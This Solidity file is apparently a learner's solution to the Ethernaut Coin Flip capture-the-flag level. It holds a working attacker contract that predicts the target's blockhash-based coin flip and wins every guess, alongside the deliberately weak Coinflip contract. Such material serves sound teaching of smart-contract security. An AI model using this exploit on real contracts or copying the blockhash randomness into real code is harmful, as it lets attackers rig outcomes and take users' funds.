// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//Hi HTN people!! Below is my solution to Ethernaut's Coin Flip CTF

contract hack{ //This contract attacks Coinflip
    Coinflip private immutable target; //This is the target contract
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address target_) {
        target = Coinflip(target_); //We pass an address to the constructor
    }
function foresee() private view returns(bool){ //repeats the calculations from Coinflip. This wouldn't work if we didn't make it a view function!
     uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
}
 function cheat() external  returns (bool) {
    return target.flip(foresee()); //We call Coinflip's "flip" function with the return value of "foresee" as the guess. 
}

}
contract Coinflip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; //Some random number used for coin flipping

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) { //reads if we were right or not. ethernaut checks if consecutiveWins == 10
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}